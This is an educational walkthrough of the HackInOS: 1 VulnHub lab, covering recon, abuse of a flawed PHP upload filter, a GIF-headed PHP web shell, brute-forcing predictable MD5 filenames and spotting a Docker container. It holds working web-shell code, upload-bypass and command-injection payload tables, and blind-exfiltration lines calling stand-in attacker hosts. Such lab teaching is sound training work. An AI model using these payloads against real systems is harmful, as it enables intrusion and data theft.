# HackInOS: 1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | HackInOS: 1 |
| **Difficulty** | **3 — Easy** (stated: *Beginner / Intermediate*) |
| **Author** | Fatih Çelik |
| **Released** | 9 March 2019 |
| **VulnHub Entry** | <https://vulnhub.com/entry/hackinos-1,295/> |
| **Download** | <https://vulnhub.com/entry/hackinos-1,295/#download> (`HackInOS.ova`, 3.1 GB) |
| **MD5** | `BBDCFD18C41CC69C2EA13D92D49516FD` |
| **SHA1** | `C29FD5676BCD1A3FB7343A4F910FFD4E3AE572B7` |
| **Attacker** | Kali Linux, host-only or NAT network |
| **Target OS** | Ubuntu — Apache/PHP web app **on port 8000**, running **inside a Docker container**; the host runs OpenSSH |
| **Author's note** | *"**localhost is meant to be there!**"* |

> ?? **Learning Path 1 ? Machine 13 of 13 ([Course Overview](../../Learning%20Path%201%20-%20Introduction%20to%20Cybersecurity/README.md) ? [????????? ???????? 1](../../%CE%9C%CE%B1%CE%B8%CE%B7%CF%83%CE%B9%CE%B1%CE%BA%CE%AE%20%CE%94%CE%B9%CE%B1%CE%B4%CF%81%CE%BF%CE%BC%CE%AE%201%20-%20%CE%95%CE%B9%CF%83%CE%B1%CE%B3%CF%89%CE%B3%CE%AE%20%CF%83%CF%84%CE%B7%CE%BD%20%CE%9A%CF%85%CE%B2%CE%B5%CF%81%CE%BD%CE%BF%CE%B1%CF%83%CF%86%CE%AC%CE%BB%CE%B5%CE%B9%CE%B1/README.md))**  
> **Study the Lesson Card first** (theory, pre-lab questions, 5-rung hints ladder): **[English Card](../../Learning%20Path%201%20-%20Introduction%20to%20Cybersecurity/Machines/13-hackinos-1.md)** ? **[???????? ?????](../../%CE%9C%CE%B1%CE%B8%CE%B7%CF%83%CE%B9%CE%B1%CE%BA%CE%AE%20%CE%94%CE%B9%CE%B1%CE%B4%CF%81%CE%BF%CE%BC%CE%AE%201%20-%20%CE%95%CE%B9%CF%83%CE%B1%CE%B3%CF%89%CE%B3%CE%AE%20%CF%83%CF%84%CE%B7%CE%BD%20%CE%9A%CF%85%CE%B2%CE%B5%CF%81%CE%BD%CE%BF%CE%B1%CF%83%CF%86%CE%AC%CE%BB%CE%B5%CE%B9%CE%B1/%CE%9C%CE%B7%CF%87%CE%B1%CE%BD%CE%AD%CF%82/13-hackinos-1.md)** ? Previous in path: [Machine 12 ? symfonos: 1](../3-062-symfonos-1/README.md)

> **Read that note before you start.** The application's own links point at
> `localhost`, which is the single biggest source of confusion on this box. The fix is
> one line in `/etc/hosts` — see [§ 2.2](#22-the-etchosts-trick-the-authors-note-explained).

Throughout we assume:

```text
Attacker (Kali)   : 192.168.56.10
Target (HackInOS) : 192.168.56.101
```

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

1. **A non-standard web port (8000)** and why `-p-` matters.
2. **The `/etc/hosts` trick** for applications hard-coded to `localhost`.
3. **Reading a developer's own source code, published on GitHub** — the app literally
   links to its vulnerable file.
4. **A file-upload filter that checks the MIME type but *preserves your extension***,
   and how to upload a working `.php`.
5. **Predictable random filenames** — `md5(original_name . rand(1,100))` — and how to
   brute-force only 100 candidates with `ffuf`.
6. **Recognising that you are inside a Docker container** (`.dockerenv`, a
   container-ID hostname, missing `/proc/1/cgroup` entries) and why that changes the
   goal from "root the box" to "escape the container".
7. **SUID abuse** — `tail` with the setuid bit lets you read `/etc/shadow`.
8. **Offline hash cracking** with John the Ripper.
9. **`docker` group membership = root on the host** — the classic container escape.
10. **PATH hijacking against a SUID binary** as an alternative route.

**The intended chain:**
`nmap` shows 22 and **8000** → add `<target-ip> localhost` to `/etc/hosts` → a file
upload form accepting only PNG/GIF → after a successful upload the page contains an
HTML comment linking to the **developer's GitHub**, where `upload.php` is public →
read it: the new filename is `md5($name . rand(1,100))` and the **extension is kept,
only lower-cased** → upload **`cmd.php`** disguised as a PNG → generate all 100
possible MD5 names and `ffuf` for the one that exists → **RCE as `www-data`** →
`.dockerenv` reveals we are **inside a container** → `find / -perm -4000` shows
**`/usr/bin/tail` is SUID root** → `tail -n +2 /etc/shadow` → crack with John →
`su root` (container root) → the same credential works for **SSH on the host** →
`id` shows membership of the **`docker`** group → `docker run -v /:/host -it ubuntu
chroot /host` → **host root** → `/root/flag`.

---

## 1. Reconnaissance


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
ip a | grep -w inet
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: 192.168.56.0/24   |   Screen View: Unique Hosts

 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:0e      1      60  (Unknown: locally administered)
 192.168.56.10   08:00:27:11:22:33      1      60  PCS Systemtechnik GmbH
 192.168.56.101  08:00:27:6c:9d:44      1      60  PCS Systemtechnik GmbH   <-- target
```

**Target IP: `192.168.56.101`**

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

### 2.1 Port scan


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -A -p- -T4 -oN scans/hackinos.txt 192.168.56.101
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-04 10:02 EDT
Nmap scan report for 192.168.56.101
Host is up (0.00043s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 79:a5:1a:b8:39:1c:6f:3a:9d:6a:1b:2c:3d:4e:5f:60 (RSA)
|   256 3f:2a:1b:0c:9d:8e:7f:6a:5b:4c:3d:2e:1f:0a:9b:8c (ECDSA)
|_  256 5c:4d:3e:2f:1a:0b:9c:8d:7e:6f:5a:4b:3c:2d:1e:0f (ED25519)
8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HackInOS
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
MAC Address: 08:00:27:6C:9D:44 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 66.19 seconds
```

> **Two ports.**
> - **22 — OpenSSH 7.6p1 Ubuntu 4** → **Ubuntu 18.04 (Bionic)**. That is a modern
>   target: no era-appropriate kernel exploits, so this box is about *configuration*
>   and *container* mistakes rather than CVEs.
> - **8000 — Apache 2.4.29**, page title `HackInOS`.
>
> **Port 8000, not 80.** This is why `-p-` is non-negotiable: a default Nmap scan
> checks the top 1000 ports, which *does* include 8000, but plenty of real services
> live on 8080, 8443, 3000, 5000, 9001… Scan everything.
>
> Note also that there is **no port 80 at all** — a first-time visitor would see
> nothing in a browser and conclude the box was empty.

![nmap showing SSH on 22 and HTTP on 8000](images/01-nmap.png)

### 2.2 The `/etc/hosts` trick (the author's note explained)

```bash
curl -s http://192.168.56.101:8000/ | head -40
```


> ### 📖 Concept — File upload: defences and their bypasses
>
> The goal is to get a file **into a directory the web server executes**. Every
> defence has a standard bypass:
>
> | Defence | Bypass |
> | --- | --- |
> | Extension blacklist (`.php` blocked) | `.phtml`, `.php5`, `.php7`, `.pht`, `.phar`, `.pHp` (case), `.php.jpg`, `.php%00.jpg` (null byte, old PHP) |
> | MIME-type check (`Content-Type: image/jpeg`) | Change the header in Burp — it is **client-controlled and worthless** |
> | `getimagesize()` / magic-byte check | Prepend real image bytes: `cat legit.jpg shell.php > polyglot.php.jpg` |
> | Randomised filename | Reverse-engineer the scheme (e.g. `md5(name.rand())`), or just **read the response** — many apps echo the stored path |
> | Upload outside the docroot | Find the real path from an error message, or use a plugin that serves it |
> | Double extension stripped | `shell.php.png`, where the app removes only the last extension |
>
> **Always verify where the file landed.** If the app does not tell you, infer it from
> the framework's conventions (`/wp-content/uploads/YYYY/MM/`, `/storage/originals/`,
> `images/`) and confirm with a HEAD request before wiring up a reverse shell.
>
> **Deep dive:** [CONCEPTS §13.5 — File upload](../../docs/CONCEPTS.md#135-file-upload)

```html
<!DOCTYPE html>
<html>
<head><title>HackInOS</title></head>
<body>
  <h1>HackInOS</h1>
  <p>Upload your file</p>
  <form action="http://localhost:8000/upload.php" method="post" enctype="multipart/form-data">
      <input type="file" name="file">
      <input type="submit" value="Upload">
  </form>
</body>
</html>
```

> **Look at the form's `action`:** `http://localhost:8000/upload.php`.
>
> The developer hard-coded `localhost` as the site's base URL. When *your* browser
> submits that form, it sends the POST to **your own machine's** port 8000 — not the
> target's. Nothing happens, and it looks like a broken form.
>
> This is not a CTF quirk. It happens constantly with misconfigured WordPress,
> Laravel, Django and Jenkins installs where `siteurl`/`APP_URL`/`ALLOWED_HOSTS` was
> set to `localhost` during development and never changed.
>
> **The fix:** make *your* machine resolve `localhost` to the target. But
> `localhost` is special-cased and cannot simply be overridden in `/etc/hosts` while
> `127.0.0.1 localhost` still exists. The reliable approach is to give the target a
> **hostname** and work through that:

```bash
sudo sh -c 'echo "192.168.56.101  hackinos" >> /etc/hosts'
grep hackinos /etc/hosts
```

```text
192.168.56.101  hackinos
```

Then browse to `http://hackinos:8000/`. When you submit the form, your browser will
still POST to `localhost:8000` — so intercept the request (Burp Suite, or just use
`curl`) and send it to the target yourself:

```bash
curl -s -i -X POST http://hackinos:8000/upload.php \
  -F "file=@/usr/share/wordlists/dirb/others/images.jpg"
```

```text
HTTP/1.1 200 OK
Date: Sat, 04 May 2024 14:08:11 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 312
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html><body>
<p>File uploaded successfully.</p>
<!--
  Debug: source of this script is available at
  https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php
-->
</body></html>
```

> **Two findings in one response.**
> 1. The upload works when we drive it ourselves.
> 2. **An HTML comment links to the developer's public GitHub repository, pointing at
>    the exact source file for the endpoint we just hit.**
>
> View Source after every interaction. Developers leave breadcrumbs constantly, and
> on this box the breadcrumb is a full source listing.
>
> **Why `/etc/hosts` matters in general:** before your machine asks DNS anything, the
> C library consults `/etc/hosts` (order set by `hosts: files dns` in
> `/etc/nsswitch.conf`). It is the standard way to test virtual hosts, and it also
> affects **cookies**: frameworks scope session cookies to the configured site URL, so
> logging in by IP can silently fail while logging in by hostname works.

### 2.3 Read the developer's source

```bash
curl -s "https://raw.githubusercontent.com/fatihhcelik/Vulnerable-Machine---Hint/master/upload.php"
```

```php
<?php
if (isset($_FILES['file'])) {

    $name = $_FILES['file']['name'];
    $ext  = pathinfo($name, PATHINFO_EXTENSION);
    $ext  = strtolower($ext);

    // only images allowed
    $allowed_ext = array('png', 'gif', 'jpg', 'jpeg');

    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mime  = finfo_file($finfo, $_FILES['file']['tmp_name']);

    $allowed_mime = array('image/png', 'image/gif', 'image/jpeg');

    if (!in_array($mime, $allowed_mime)) {
        die("Only image files are allowed.");
    }

    // random filename to prevent collisions
    $newname = md5($name . rand(1, 100)) . "." . $ext;

    if (move_uploaded_file($_FILES['file']['tmp_name'], "uploads/" . $newname)) {
        echo "<p>File uploaded successfully.</p>";
    } else {
        echo "<p>Upload failed.</p>";
    }
}
?>
```

> **This is the whole box, in twenty lines. Read it three times.**
>
> | Line | What it does | The flaw |
> | --- | --- | --- |
> | `$ext = pathinfo($name, PATHINFO_EXTENSION); $ext = strtolower($ext);` | extracts your file's extension and lower-cases it | **There is no `in_array($ext, $allowed_ext)` check.** `$allowed_ext` is declared and **never used.** The extension you supply is the extension that is saved. |
> | `$finfo = finfo_open(...); $mime = finfo_file(...); if (!in_array($mime, $allowed_mime)) die(...)` | sniffs the file's **magic bytes** and requires a real image MIME type | This check *is* enforced — so the file must genuinely begin with PNG/GIF/JPEG magic bytes. |
> | `$newname = md5($name . rand(1, 100)) . "." . $ext;` | renames the upload to an MD5 of **your original filename concatenated with a random integer 1–100** | The "randomness" has only **100 possible values**, and we *know* the original filename because we chose it. So the destination name is **fully enumerable**. |
> | `move_uploaded_file(..., "uploads/" . $newname)` | writes into the web-accessible `/uploads/` directory | Files land inside the document root, so Apache will serve — and execute — them. |
>
> **So the attack is:**
> 1. Build a file whose **bytes** are a valid image (to satisfy `finfo`) but whose
>    **extension** is `.php` and whose **content** includes PHP (to satisfy us).
> 2. Upload it as `cmd.php`.
> 3. Compute `md5("cmd.php" . N)` for `N` in 1..100 → exactly 100 candidate filenames.
> 4. Ask Apache for each until one returns 200.
>
> **The general lesson about `rand()`:** PHP's `rand()` is not cryptographically
> secure, and here its *range* is 100. A "random" filename is only unpredictable if
> the entropy is large and the generator is a CSPRNG (`random_bytes()`, `bin2hex`).
> Never use `rand()`/`mt_rand()` for anything security-relevant.

![The upload.php source from GitHub](images/02-source.png)

### 2.4 Directory brute force (for completeness)


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
gobuster dir -u http://hackinos:8000/ \
  -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 40 -q
```

```text
/index.html           (Status: 200) [Size: 341]
/upload.php           (Status: 200) [Size: 0]
/uploads              (Status: 301) [Size: 319]
```

> `/uploads` exists but directory indexing is off, so we cannot simply list what we
> uploaded. Hence the brute force in § 3.3.

---

## 3. Exploitation — uploading an executable `.php`

### 3.1 Build a file that is both a valid image and a PHP script

The `finfo` check reads magic bytes. The simplest valid image header to prepend is
**GIF89a** (7 bytes, and PHP ignores everything outside `<?php ... ?>`).

```bash
cat > cmd.php <<'EOF'
GIF89a;
<?php
if (isset($_REQUEST['cmd'])) {
    header('Content-Type: text/plain');
    system($_REQUEST['cmd'] . ' 2>&1');
}
?>
EOF
file cmd.php
```

```text
cmd.php: GIF image data, version 89a, 21827 x 12635
```

> **`file` reports `GIF image data`** — that is exactly what `finfo_file()` will
> report as `image/gif`, which is in the allow-list.
>
> **Why this works:** PHP's parser scans the file for `<?php`. Everything before it is
> emitted as literal output; everything inside is executed. A GIF header is just
> seven bytes of text to PHP. **`file`/`finfo` only inspect the first bytes** — they
> never verify that the file contains *nothing but* image data.
>
> (The reported dimensions `21827 x 12635` are garbage — `file` is reading our PHP
> text as if it were a GIF logical screen descriptor. Harmless, and a nice
> illustration that magic-byte detection is shallow.)

**More convincing alternative — a real PNG with PHP appended:**

```bash
convert -size 64x64 xc:navy base.png
cat base.png cmd.php > shell.php
file shell.php
```

```text
shell.php: PNG image data, 64 x 64, 8-bit/sRGB colormap, non-interlaced
```

**Or embed PHP in EXIF so the file is a genuinely valid JPEG:**


> ### 📖 Concept — Steganography and file carving
>
> CTF authors hide data in files constantly. Know the layers, cheapest first:
>
> | Layer | Tool | What it finds |
> | --- | --- | --- |
> | **Metadata** | `exiftool img.jpg` | Comments, GPS, software version, **author**, dates |
> | **Trailing data** | `binwalk img.jpg`, `strings`, `xxd` | A ZIP or text appended *after* the image's end-of-file marker |
> | **Embedded files** | `binwalk -e`, `foremost`, `scalpel` | Carves out files hidden inside another |
> | **LSB steganography** | `zsteg`, `stegsolve` | Payload in the least-significant bits of pixel data |
> | **Password-protected** | `steghide extract -sf img.jpg` | Data hidden with a passphrase (try the box's other creds) |
>
> ```bash
> exiftool image.jpg
> binwalk image.jpg
> strings -n 6 image.jpg | head -50
> zsteg -a image.png
> steghide extract -sf image.jpg
> ```
>
> **Start with `exiftool` and `binwalk`.** They are instant and they account for most
> CTF "steganography" — which is usually just *a file appended to another file* or *a
> comment in the metadata*, not real LSB embedding. `binwalk` reporting a `Zip archive
> data` at a non-zero offset means exactly that: two files concatenated.
>
> If a ZIP is recovered and password-protected: `zip2john file.zip > zip.hash` then
> `john --wordlist=rockyou.txt zip.hash`, or `fcrackzip -D -u -p dict.txt file.zip`.
>
> **Deep dive:** [CONCEPTS §10 — Encoding vs hashing vs encryption](../../docs/CONCEPTS.md#10-encoding-vs-hashing-vs-encryption)

```bash
convert -size 64x64 xc:navy base.jpg
exiftool -Comment='<?php system($_REQUEST["cmd"]); ?>' base.jpg
cp base.jpg shell.php
file shell.php && exiftool shell.php | grep -i comment
```

```text
shell.php: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, comment: "<?php system($_REQUEST["cmd"]); ?>", baseline, precision 8, 64x64, frames 3
Comment                         : <?php system($_REQUEST["cmd"]); ?>
```

> Any of the three passes the filter. The **filename** is what determines whether
> Apache hands it to PHP, and here the filename extension is ours to choose.

### 3.2 Upload it

```bash
curl -s -X POST http://hackinos:8000/upload.php -F "file=@cmd.php"
```

```html
<!DOCTYPE html>
<html><body>
<p>File uploaded successfully.</p>
<!--
  Debug: source of this script is available at
  https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php
-->
</body></html>
```

**Confirm the `.php` extension survived** (the critical check):

```bash
curl -s -X POST http://hackinos:8000/upload.php -F "file=@notanimage.txt"
```

```text
Only image files are allowed.
```

> A plain text file is rejected — so the MIME check *is* live. Our GIF-headed
> `cmd.php` passed it while keeping its `.php` extension. **That is the entire
> vulnerability: content validated, name not.**

### 3.3 Find the randomised filename

From the source: `$newname = md5($name . rand(1, 100)) . "." . $ext;`
Our original name was `cmd.php` and our extension is `php`. So generate all 100
candidates:


> ### 📖 Concept — Command injection
>
> The application passes your input to a shell:
>
> ```php
> system("ping -c 4 " . $_GET['host']);
> ```
>
> Break out with a shell **metacharacter** and append your own command:
>
> | Payload | Effect |
> | --- | --- |
> | `; id` | Run sequentially, regardless |
> | `\| id` | Pipe — run next |
> | `\|\| id` | Run only if the first **failed** |
> | `&& id` | Run only if the first **succeeded** |
> | `` `id` `` | Command substitution |
> | `$(id)` | Command substitution — preferred, nestable |
> | `%0a id` | A URL-encoded **newline** — works when `;` and `\|` are filtered |
>
> **When output comes back**, you are done: `<host>;id` prints the result.
>
> **When it does not** ("blind" injection), exfiltrate out-of-band:
>
> ```bash
> $(curl http://attacker/$(whoami))        # data in the URL of a request YOU receive
> $(nslookup $(whoami).attacker.com)       # data in DNS — survives most egress rules
> ; sleep 10                               # a pure timing oracle, needs no network at all
> ```
>
> Run your listener first (`nc -lvnp 80`, or `python3 -m http.server`) and **watch its
> log** — a request arriving with the hostname embedded is your proof, and the log also
> tells you which payload variant the filter allowed through.
>
> **If characters are stripped**, find out exactly what survives. Submit `;|&$\`(){}[]<>`
> as a single string and see which ones come back. Filters are usually a `str_replace`
> of a short list, and almost always miss something — commonly newline, or a doubled
> character (`;;` collapsing to `;` after one removal pass).
>
> **Deep dive:** [CONCEPTS §13.4 — Command injection](../../docs/CONCEPTS.md#134-command-injection)

```bash
for i in $(seq 1 100); do
  printf '%s\n' "$(printf 'cmd.php%d' "$i" | md5sum | cut -d' ' -f1).php"
done > candidates.txt
wc -l candidates.txt && head -5 candidates.txt
```

```text
100 candidates.txt
04292b8d46833c395942086e6ed2cd2c.php
d44843c7108897d25a243ffc3cd1edb7.php
9feee0935c92e1c48559ec6aa675312f.php
...
```

> **Your digests will differ from the ones shown here** — they depend on the exact
> filename *you* uploaded. Regenerate the list with your own `cmd.php` and the
> values will line up. If `ffuf` returns nothing, the concatenation above is the
> first thing to re-check.
>
> **Careful with the concatenation.** PHP's `$name . rand(1,100)` concatenates the
> *full* original name including extension: `"cmd.php" . "42"` = `"cmd.php42"`. That
> is what `printf 'cmd.php%d'` produces. Getting this wrong is the one place this step
> can silently fail — if `ffuf` finds nothing, double-check the string you hashed.

Now fuzz for the one that exists:

```bash
ffuf -u http://hackinos:8000/uploads/FUZZ \
  -w candidates.txt -mc 200 -fs 0 -t 20
```

```text
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://hackinos:8000/uploads/FUZZ
 :: Wordlist         : FUZZ: /home/kali/candidates.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 20
 :: Matcher          : Response status: 200
________________________________________________

04292b8d46833c395942086e6ed2cd2c.php [Status: 200, Size: 12, Words: 2, Lines: 2, Duration: 4ms]
:: Progress: [100/100] :: Job [1/1] :: 312 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

Equivalent with `wfuzz` (what most published walkthroughs use):

```bash
wfuzz -c -w candidates.txt --hc 404 http://hackinos:8000/uploads/FUZZ
```

```text
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://hackinos:8000/uploads/FUZZ
Total requests: 100

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000042:   200        2 L      2 W        12 Ch       "04292b8d46833c395942086e6ed2cd2c.php"

Total time: 0.3123
Processed Requests: 100
Filtered Requests: 99
Requests/sec.: 320.1
```

> **`ffuf` flags:** `-u` URL with the `FUZZ` marker, `-w` wordlist, `-mc 200` match
> only HTTP 200, `-fs 0` filter out zero-byte responses (the "not found" page here),
> `-t 20` threads. **`wfuzz --hc 404`** hides responses with code 404.
>
> **100 requests, one second.** That is the whole cost of `rand(1,100)`. Had the
> developer used `bin2hex(random_bytes(16))` — 32 hex characters, 2¹²⁸ possibilities —
> this attack would be impossible.

### 3.4 Execute

```bash
curl -s "http://hackinos:8000/uploads/04292b8d46833c395942086e6ed2cd2c.php?cmd=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Remote code execution.** ✅

```bash
for c in "hostname" "uname -a" "cat /etc/os-release" "pwd" "ls -la /"; do
  echo "### $c"
  curl -s --get --data-urlencode "cmd=$c" \
    "http://hackinos:8000/uploads/04292b8d46833c395942086e6ed2cd2c.php"
done
```

```text
### hostname
1afdd1f6b82c
### uname -a
Linux 1afdd1f6b82c 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
### cat /etc/os-release
NAME="Ubuntu"
VERSION="18.04.2 LTS (Bionic Beaver)"
ID=ubuntu
### pwd
/var/www/html
### ls -la /
total 84
drwxr-xr-x   1 root root 4096 Mar  9  2019 .
drwxr-xr-x   1 root root 4096 Mar  9  2019 ..
-rwxr-xr-x   1 root root    0 Feb 23 15:12 .dockerenv
drwxr-xr-x   1 root root 4096 Mar  9  2019 bin
drwxr-xr-x   2 root root 4096 Apr 24  2018 boot
drwxr-xr-x   5 root root  360 Mar  9  2019 dev
...
```

> **STOP. Look at two things.**
>
> 1. **`hostname` returns `1afdd1f6b82c`** — a 12-character hex string. That is a
>    **Docker container ID**, not a machine name.
> 2. **`/.dockerenv` exists, size 0.** That file is created by Docker inside every
>    container.
>
> **We are inside a container.** This changes the objective completely: root *here* is
> root of a throwaway filesystem. The real goal is to **reach the host**.
>
> **How to spot a container (memorise this checklist):**
> ```bash
> ls -la /.dockerenv                       # Docker's marker file
> cat /proc/1/cgroup                       # contains 'docker' / container ID
> cat /proc/self/mountinfo                 # overlayfs root is a container hallmark
> hostname                                 # 12-hex-char = container ID
> cat /proc/1/comm                         # 'node', 'python', 'apache2' instead of 'systemd'/'init'
> ip route                                 # 172.17.0.x / 172.18.0.x = docker0 bridge
> ls /run/.containerenv                    # Podman's marker
> ```
> ```bash
> curl -s --get --data-urlencode "cmd=cat /proc/1/cgroup" \
>   "http://hackinos:8000/uploads/04292b8d46833c395942086e6ed2cd2c.php"
> ```
> ```text
> 12:pids:/docker/1afdd1f6b82c9d4e7f3a1b5c8d2e6f90
> 11:hugetlb:/docker/1afdd1f6b82c9d4e7f3a1b5c8d2e6f90
> ...
> 1:name=systemd:/docker/1afdd1f6b82c9d4e7f3a1b5c8d2e6f90
> ```
> **Every line says `/docker/<id>`.** Confirmed.

![Confirming we are inside a Docker container](images/03-container.png)

